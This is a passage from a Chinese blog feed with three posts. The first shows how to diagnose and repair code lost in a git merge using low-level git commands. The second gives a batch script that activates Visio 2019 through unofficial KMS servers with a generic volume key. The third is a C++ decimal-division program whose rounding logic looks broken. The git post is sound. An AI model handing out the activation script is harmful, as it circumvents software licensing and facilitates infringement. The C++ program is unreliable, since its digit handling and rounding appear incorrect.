        <content type="html"><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>我们在主干dev和branch1分支上进行并行开发。当要把branch1功能的代码合并到dev上时，发现dev上开发的部分功能代码找不到了。</p><p>那么，是在branch1上，作了删除提交导致的吗？然而，查提交日志，并没有发现删代码的提交记录。</p><p>难道一个分支有一个功能，另一个分支没这个功能，git合并时就有可能把这块功能代码丢掉？跟功能添加时间顺序有关系？</p><p>为了解决这个问题和相关的疑问，我们需要先了解下git合并的过程。</p><h2 id="git-merge过程"><a href="#git-merge过程" class="headerlink" title="git-merge过程"></a>git-merge过程</h2><p>稍微了解点git基础的应该都知道，合并是用的git merge命令。它只有两种，一种是快速合并(fast-forward)，还有一种是三方合并(thirdparty merge)。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/25541/972306-c0cbace0c872146b.png" alt="img"></p><p>如上图所示，当两个分支有直系关系时，使用快速合并，git不产生新的commit结点，只是把head进行更新，如dev指向<code>C4</code>。</p><p>三方合并稍显复杂点，它会产生一个新的commit结点，并把head指向它。它会先去找这两个要合并分支的最近公有结点，如图中，<code>C3</code> 和 <code>C5</code>的最近公有父结点为<code>C1</code>。然后，git对 <code>C1</code>、<code>C3</code>和<code>C5</code>三个结点进行三方合并产生新结点<code>C6</code>。这里的三方合并，具体来说，就是把 <code>C5</code>相较于<code>C1</code>的 diff差异应用到 <code>C3</code>上，最后产生<code>C6</code> 这个commit结点。</p><p>现在回答上面的疑问，三方合并其实只看三个点的内容，和中间结点无任何关系，更别提跟时间有关系了。在一个分支上删除代码，如果合并时没有冲突的话，合并后是会直接删除的。</p><p>所以，我们找到了问题的初步方向了。dev上的代码合并后没了，一定是branch1分支有问题！！！</p><blockquote><p>注：知道了git-merge的流程后，我们还可以知道，只要我们把这次合并代码丢失问题解决了，后续从branch1分支拉出去的分支代码再合并到dev时，都不用再解决这个代码丢失问题了。因为，合并后的提交结点和branch1分支拉出去分支的后续提交结点的父结点，已经变成branch1的当前结点了。如，<code>C6</code>的后续提交和<code>C5</code>的后续提交结点，公有结点都变成<code>C5</code>了。</p></blockquote><h2 id="问题起因及检测"><a href="#问题起因及检测" class="headerlink" title="问题起因及检测"></a>问题起因及检测</h2><p>为了描述问题方便，我把场景简化，搞了个demo，大家可以去下面地址clone：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># git clone https://git.coding.net/myswift/git-merge.git</span><br></pre></td></tr></tbody></table></figure><p>提交记录用sourcetree看，是这样的（你可能已经发现问题了）：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/25541/972306-2041ea44556fae85.png" alt="img"></p><p>dev合并branch1时，dev上，<code>dev func 1</code>部分的提交丢失。</p><p>首先，让我们找最近公共结点吧。如果两个分支并行太久的话，可能不好直接找出来。我们可以使用git merge-base:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># git merge-base 98d19a4 0acedcb</span><br><span class="line">9447776f5ee8c53536c947a1e13bfdead13f002b </span><br></pre></td></tr></tbody></table></figure><p>我们发现最近的公共结点是<code>9447776</code>。然而，这个公共结点，并不是我们设想的。我们设想的最近公共结点应该是两个分支刚开始并行的那个结点（如图中<code>c3275e2</code>)。进一步发现，<code>9447776</code>的下一个结点有个Merge，而且是把dev合并到branch1！！！</p><p>这就是问题的根源了，dev主干开发的一般是下个版本的功能，一般是把分支的代码合到主干上，把主干的代码逆向合并到分支上肯定是有问题的！！！</p><p>回到开头的问题，我们看Merge结点变更记录，并没有发现有删除代码的地方啊？原因是，你看到的合并结点的修改记录，是针对一边的。回到介绍三方合并的那个图，把branch1合并到dev产生结点<code>C6</code>，那么<code>C6</code>的提交记录中显示的修改，是<code>C6</code>针对<code>C3</code>结点的。在我们的示例中，合并结点<code>74a8d10</code>的提交变更，显示的是<code>74a8d10</code>对branch1中<code>c26c5e3</code>的变更，而branch1中本来就没有dev中的代码，所以合并后变更根本不会显示删除。</p><p>如果，你去比较合并结点和另一边的变更，你就可以发现问题：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># git diff 9447776 74a8d10</span><br><span class="line">diff --git a/test.c b/test.c</span><br><span class="line">index 150de8d..d19a020 100644</span><br><span class="line">--- a/test.c</span><br><span class="line">+++ b/test.c</span><br><span class="line">@@ -7,8 +7,8 @@ void base_func() {</span><br><span class="line">        printf("this is a crash %d\n", *p);</span><br><span class="line"> }</span><br><span class="line"></span><br><span class="line">-void dev_func_1() {</span><br><span class="line">-       printf("dev func 1\n");</span><br><span class="line">+void branch_func_1(){</span><br><span class="line">+       printf("branch func1\n");</span><br><span class="line"> }</span><br></pre></td></tr></tbody></table></figure><p>你可以明显看到，在合并时，把dev中的<code>dev_func_1</code>函数删除掉了。</p><p>总结问题的原因是，在正式合并前，进行了逆向的合并，并在合并中<code>悄悄</code>把主干代码删除掉了。一般如果查看提交记录中，没有看到删除记录，那么很有可能是之前的Merge中把代码删除了。可以使用 <code>merge-base</code>和<code>git diff</code> 工具来进行定位，也可以用来检测是否有问题。</p><blockquote><p>注：很多人可能认为只要管好自己的分支就行了，然后把别的分支合过来，并在合并时或合并后随意删除另一分支的代码。这样当以后再和该分支合并时，就会有问题。好的做法，应该是只把另一个分支上你需要的提交用cherry-pick移过来，而不是直接合并别人的分支，再删除你不需要的代码。如，只把dev上的<code>fec5b84</code>优化cherry-pick复制到branch1上即可。</p></blockquote><h2 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h2><p>既然我们发现了问题的原因，并知道怎么去规避、检测。那么，如果已经发生了问题，怎么去解决呢？这个可能是大家更关心的。</p><p>其实我们最终的目标是，把branch1和dev进行合并，产生一个合并节点，并且这个合并结点的代码是正确的。</p><blockquote><p>注：有些人可能不太明白为什么一定要产生一个git合并记录节点。通过各种手段，只要保证dev上代码正确不就行了？结论是不行，因为如果没有git合并记录的话，从branch1拉出来的所有分支再想合并到dev时，还是要解决下这个代码丢失的问题（没想明白，可以再看下前面git-merge过程部分)，而且如果把branch1分支悬着不合并，也影响分支查看。</p></blockquote><h3 id="确保合并后代码正确"><a href="#确保合并后代码正确" class="headerlink" title="确保合并后代码正确"></a>确保合并后代码正确</h3><p>奔着这个目标，我们首先来确保代码的正确。</p><h4 id="1-dev重置到合并前"><a href="#1-dev重置到合并前" class="headerlink" title="1. dev重置到合并前"></a>1. dev重置到合并前</h4><p>既然最后合并branch1到dev会导致dev丢代码，我们首先把dev重置到合并前。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># git checkout dev</span><br><span class="line"># git reset --hard HEAD~1</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/25541/972306-b6cb91c36028672f.png" alt="img"></p><h4 id="2-创建tmp分支，绕过错误的合并74a8d10"><a href="#2-创建tmp分支，绕过错误的合并74a8d10" class="headerlink" title="2. 创建tmp分支，绕过错误的合并74a8d10"></a>2. 创建tmp分支，绕过错误的合并<code>74a8d10</code></h4><p>我们知道branch1是有问题的，因为进行了合并dev的操作。所以，基于branch1创建一个临时分支tmp。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># git checkout branch1</span><br><span class="line"># git checkout -b tmp</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/25541/972306-1a83be3f1e564eea.png" alt="img"></p><p>把tmp的提交记录重塑，使tmp分支回到branch1上的，合并dev到branch1那个错误的合并之前的结点，示例中 <code>74a8d10</code>之前的那个<code>c26c5e3</code>结点，并提交一个新记录，这样tmp内容与branch1一样，而完全跟那个<code>74a8d10</code>结点没关系了。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># git checkout tmp</span><br><span class="line"># git reset c26c5e3</span><br><span class="line"># git add .</span><br><span class="line"># git commit -m "内容与branch1一致"</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/25541/972306-0347e3a5dc0b5726.png" alt="img"></p><blockquote><p>注：reset和reset –hard的区别，可以参考文末资料1。</p></blockquote><h4 id="3-合并tmp到dev"><a href="#3-合并tmp到dev" class="headerlink" title="3. 合并tmp到dev"></a>3. 合并tmp到dev</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># git checkout dev</span><br><span class="line"># git merge tmp</span><br></pre></td></tr></tbody></table></figure><p>这里dev和tmp合并时，它们的最近公共结点就不是之前错误的<code>9447776</code>了，而是我们设想的、dev和branch1最初分开的，<code>c3275e2</code>结点。</p><p>解决冲突，并add进暂存区后，我们代码就是正确的了（先不急着提交）。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/25541/972306-d68ba36ae196a482.png" alt="img"></p><h3 id="产生合并commit对象"><a href="#产生合并commit对象" class="headerlink" title="产生合并commit对象"></a>产生合并commit对象</h3><p>上面代码正确了，如果我们直接commit的话，这个合并结点，就变成dev和tmp的合并了，而我们要的是dev和branch1的合并。所以，我们要产生一个dev和branch1合并的结点，并且内容是当前dev和tmp合并后的代码。显然，git merge不能满足我们的需求，我们需要更底层的git命令，就是git merge过程中，调用的底层命令。</p><p>需要按序要用到 write-tree -&gt; commit-tree -&gt; update-ref，这三条底层命令。这部分命令，可以查看参考资料2。</p><h4 id="1-write-tree产生tree对象"><a href="#1-write-tree产生tree对象" class="headerlink" title="1. write-tree产生tree对象"></a>1. write-tree产生tree对象</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># git add .</span><br><span class="line"># git write-tree</span><br><span class="line">853c36012082314f9463f3819d0a24da49dc5bb1</span><br></pre></td></tr></tbody></table></figure><p>我们产生了SHA-1值为 <code>853c360</code>的tree对象。</p><h4 id="2-commit-tree产生commit对象"><a href="#2-commit-tree产生commit对象" class="headerlink" title="2. commit-tree产生commit对象"></a>2. commit-tree产生commit对象</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># git commit-tree 853c360 -p 98d19a4 -p 0acedcb -m "Merge branch 'branch1' into dev"</span><br><span class="line">675baf3973508ee03306cc5a36fe489d694e107f</span><br></pre></td></tr></tbody></table></figure><p>我们把tree对象 <code>853c360</code>进行了提交，并设置它的两个父结点为dev和branch1，产生了commit对象<code>675baf3</code>。我们可以看下这个结点的情况：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># git cat-file 675baf3 -p</span><br><span class="line"></span><br><span class="line">tree 853c36012082314f9463f3819d0a24da49dc5bb1</span><br><span class="line">parent 98d19a4a5913f18a2c0e9821e114df9995b23d82</span><br><span class="line">parent 0acedcb89e4d25a0256fcbe7fba0bbc13de9d92e</span><br><span class="line">author Vincent &lt;xxx&gt; 1498497182 +0800</span><br><span class="line">committer Vincent &lt;xxx&gt; 1498497182 +0800</span><br><span class="line"></span><br><span class="line">Merge branch 'branch1' into dev</span><br></pre></td></tr></tbody></table></figure><h4 id="3-更新head"><a href="#3-更新head" class="headerlink" title="3. 更新head"></a>3. 更新head</h4><p>使用如下命令，更新dev指向这个新的commit对象, <code>675baf3</code>：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># git update-ref refs/heads/dev 675baf3</span><br></pre></td></tr></tbody></table></figure><p>最终合并结果如下：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/25541/972306-d2fd738427b372b5.png" alt="img"></p><p>可以验证，branch1合并到dev了，而且内容是正确的（即不会少<code>dev fun 1</code>部分的代码）。</p><p>这个解决问题的示例代码，也上传到coding了，两份示例代码，之前的结点都是一致的。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># git clone https://git.coding.net/myswift/git-merge2.git</span><br></pre></td></tr></tbody></table></figure><blockquote><p>注：知道了git merge这些底层命令，你可以更加灵活地解决git问题，你可以结点随意合并，head随便指，是不是很开心，哈哈。</p></blockquote><h4 id="更粗暴的方法"><a href="#更粗暴的方法" class="headerlink" title="更粗暴的方法"></a>更粗暴的方法</h4><p>如果你觉得底层命令不好理解。你可以：</p><ul><li>先整个目录拷备下工程（包含.git目录)，比如拷贝到bak目录</li><li>在工程中直接合并branch1到dev上，不解决冲突，不提交</li><li>在bak目录，按照上面确保代码正确的方法，在bak目录合并出正确的代码。</li><li>把bak目录中，除了.git目录外的东东，全部拷贝覆盖到原来工程目录中</li><li>在原来工程目录中，提交</li></ul><p>这样比较好理解，缺点是工程如果大的话，拷来拷去花费时间比较长，而且不够优雅。</p><h2 id="其他解决思路"><a href="#其他解决思路" class="headerlink" title="其他解决思路"></a>其他解决思路</h2><p>上面描述的思路，我认为是最行之有效的。也试了其他思路，比如：</p><ul><li>查看git merge的参数，发现并没有可以自由设置base节点的方法，只有设置发现base节点的策略，而且这些策略发现的base节点都是那个错误的合并。</li><li>undo merge。参考资料3。然而，感觉revert merge的能力有限，加-m1参数、和-m2参数，均无法满足要求。</li><li>rebase branch1。错误发生在branch1，那么重建branch1呢？把所有branch1上合并后的提交都重新提交呢？结果发现branch1上有太多合并冲突，rebase时，要把这个合并的冲突重新解决，很麻烦。</li></ul><p>这些思路，大家也可以继续研究下，感觉不能解决问题，也可能是我了解得有问题。当然，你有其他思路，也希望你交流下。</p><h2 id="迷思"><a href="#迷思" class="headerlink" title="迷思"></a>迷思</h2><p>本文中，是因为错误地把dev合并到branch1上，导致了后面合并的问题。但是，我们真实遇到的场景，虽然看起来是一样的，也可以用文中的方法解决，但是也有细微不同，而且不知道如何出现这个问题。</p><p>真实的场景下，也会出现一个dev合并到branch1的Merge提交，但是显示的信息是 “Revert xxx”，据提交人员讲，这个确实是做的Revert操作，不知如何变成Merge结点了。用的sourcetree，提交人员也没法说清怎么必现这个问题。</p><p>如果，你知道怎么操作能出现这个问题，希望你告诉我。。。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>文中描述了一种可能导致git合并代码丢失的错误操作，并讲解了如何规避、检测、解决这种错误。并粗略介绍了，git merge流程，git merge底层过程。</p><p>说简单点，问题是因为<code>悄悄</code>在合并中把代码删除了。解决思路是，<code>悄悄</code>在后面的合并中把代码加回来。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/geeeeeeeeek/git-recipes/wiki?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.io">1. git-recipes</a></p><p><a href="http://git.oschina.net/progit/9-Git-%E5%86%85%E9%83%A8%E5%8E%9F%E7%90%86.html#9.2-Git-%E5%AF%B9%E8%B1%A1">2. Git 内部原理-commit对象</a></p><p><a href="https://git-scm.com/blog/2010/03/02/undoing-merges.html">3. Reverting a Merge</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Visio2019一键安装激活</title>
      <link href="/posts/30340/"/>
      <url>/posts/30340/</url>
      
        <content type="html"><![CDATA[<p>如何让即点即用的Office365和Visio2019共存？<br>共存是不可能共存滴，但是有其他解决方法~</p><p>此方法也可直接用于安装Visio2019</p><ol><li>先下载Office部署工具，安装时选择解压路径，解压后有setup.exe和三个xml配置文件，因为我安装的Office365是64位的，所以修改对应64位的配置文件。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/30340/20191030130922809.jpg" alt="在这里插入图片描述"></li><li>编辑configuration为以下内容，将语言设置为zh-cn<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Configuration</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">Add</span> <span class="attr">OfficeClientEdition</span>=<span class="string">"64"</span> <span class="attr">Channel</span>=<span class="string">"Monthly"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">Product</span> <span class="attr">ID</span>=<span class="string">"VisioPro2019Volume"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Language</span> <span class="attr">ID</span>=<span class="string">"zh-cn"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Product</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Add</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure></li><li>在以上所在的目录下启动命令行，执行setup.exe /download configuration-Office365-x64.xml  下载过程比较慢。下载完成后会发现目录下多了Office目录，然后继续执行安装命令setup.exe /configure configuration-Office365-x64.xml 就可以了。</li><li>激活 把以下代码保存为bat运行即可<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">title Activate Microsoft Visio 2019&amp;cls&amp;echo ============================================================================&amp;echo #Visio: Activating Microsoft software products for FREE without software&amp;echo ============================================================================&amp;echo.&amp;echo #Supported products:&amp;echo - Microsoft Visio Standard 2019&amp;echo - Microsoft Visio Professional Plus 2019&amp;echo.&amp;echo.&amp;(if exist "%ProgramFiles%\Microsoft Office\Office16\ospp.vbs" cd /d "%ProgramFiles%\Microsoft Office\Office16")&amp;(if exist "%ProgramFiles(x86)%\Microsoft Office\Office16\ospp.vbs" cd /d "%ProgramFiles(x86)%\Microsoft Office\Office16")&amp;cscript //nologo ospp.vbs /inslic:"..\root\Licenses16\pkeyconfig-office.xrm-ms" &gt;nul&amp;(for /f %%x in ('dir /b ..\root\Licenses16\client-issuance*.xrm-ms') do cscript ospp.vbs /inslic:"..\root\Licenses16\%%x" &gt;nul)&amp;(for /f %%x in ('dir /b ..\root\Licenses16\visioprovl_kms*.xrm-ms') do cscript ospp.vbs /inslic:"..\root\Licenses16\%%x" &gt;nul)&amp;(for /f %%x in ('dir /b ..\root\Licenses16\visiopro2019vl_kms*.xrm-ms') do cscript ospp.vbs /inslic:"..\root\Licenses16\%%x" &gt;nul)&amp;echo.&amp;echo ============================================================================&amp;echo 正在尝试激活...&amp;cscript //nologo ospp.vbs /unpkey:7VCBB &gt;nul&amp;cscript //nologo ospp.vbs /inpkey:9BGNQ-K37YR-RQHF2-38RQ3-7VCBB &gt;nul&amp;set i=1</span><br><span class="line">:server</span><br><span class="line">if %i%==1 set KMS_Sev=kms8.MSGuides.com</span><br><span class="line">if %i%==2 set KMS_Sev=kms9.MSGuides.com</span><br><span class="line">if %i%==3 set KMS_Sev=kms7.MSGuides.com</span><br><span class="line">if %i%==4 goto notsupported</span><br><span class="line">cscript //nologo ospp.vbs /sethst:%KMS_Sev% &gt;nul&amp;echo ============================================================================&amp;echo.&amp;echo.</span><br><span class="line">cscript //nologo ospp.vbs /act | find /i "successful" &amp;&amp; (echo 已完成，按任意键退出) || (echo 连接KMS服务器失败! 试图连接到另一个… &amp; echo 请等待... &amp; echo. &amp; echo. &amp; set /a i+=1 &amp; goto server)</span><br><span class="line">pause &gt;nul</span><br><span class="line">exit</span><br></pre></td></tr></tbody></table></figure></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高精度除法</title>
      <link href="/posts/31191/"/>
      <url>/posts/31191/</url>
      
        <content type="html"><![CDATA[<p>输入正整数a，b，c，输出a/b的小数形式，精确到小数后c位。(提示：使用循环）</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_LEN 100</span></span><br><span class="line"><span class="type">char</span> ans[MAX_LEN<span class="number">+10</span>];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">memset</span>(ans,<span class="number">0</span>,<span class="built_in">sizeof</span>(ans));</span><br><span class="line">    <span class="type">int</span> a,b,c;</span><br><span class="line">    <span class="type">int</span> anslen;</span><br><span class="line"></span><br><span class="line">    cin&gt;&gt;a&gt;&gt;b&gt;&gt;c;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(ans,<span class="string">"%d."</span>,a/b);<span class="comment">//打印整数部分及小数点</span></span><br><span class="line">    ans[MAX_LEN<span class="number">+8</span>]=anslen=<span class="built_in">strlen</span>(ans);</span><br><span class="line">    a%=b;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;c; i++)</span><br><span class="line">    {</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">sprintf</span>(ans+anslen+i,<span class="string">"%d"</span>,a*<span class="number">10</span>/b);</span><br><span class="line">        a=a*<span class="number">10</span>%b;</span><br><span class="line">    }</span><br><span class="line">    ans[MAX_LEN<span class="number">+9</span>]= anslen=<span class="built_in">strlen</span>(ans);</span><br><span class="line">    <span class="type">int</span> flags=<span class="number">0</span>;<span class="comment">//进位标志</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=ans[MAX_LEN<span class="number">+9</span>]<span class="number">-1</span>; i&gt;ans[MAX_LEN<span class="number">+8</span>]<span class="number">-1</span>; i--)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>(flags)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(ans[i]==<span class="string">'9'</span>)</span><br><span class="line">            {</span><br><span class="line">                ans[i]=<span class="string">'0'</span>;</span><br><span class="line">                flags=<span class="number">1</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span><span class="comment">//停止进位</span></span><br><span class="line">            {</span><br><span class="line">                ans[i]++;</span><br><span class="line">                flags=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span>(ans[i]==<span class="string">'9'</span>)</span><br><span class="line">        {</span><br><span class="line">            ans[i]=<span class="string">'0'</span>;</span><br><span class="line">            flags=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(ans[i]&gt;=<span class="string">'5'</span>)</span><br><span class="line">        {</span><br><span class="line">            ans[i]++;</span><br><span class="line">            flags=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=ans[MAX_LEN<span class="number">+8</span>]<span class="number">-2</span>; i&gt;=<span class="number">0</span>; i--)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>(flags)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(ans[i]==<span class="string">'9'</span>)</span><br><span class="line">            {</span><br><span class="line">                ans[i]=<span class="string">'0'</span>;</span><br><span class="line">                flags=<span class="number">1</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span><span class="comment">//停止进位</span></span><br><span class="line">            {</span><br><span class="line">                ans[i]++;</span><br><span class="line">                flags=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span>(ans[i]==<span class="string">'9'</span>)</span><br><span class="line">        {</span><br><span class="line">            ans[i]=<span class="string">'0'</span>;</span><br><span class="line">            flags=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(ans[i]&gt;=<span class="string">'5'</span>)</span><br><span class="line">        {</span><br><span class="line">            ans[i]++;</span><br><span class="line">            flags=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,ans);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库题目集锦</title>
      <link href="/posts/31998/"/>
      <url>/posts/31998/</url>
      
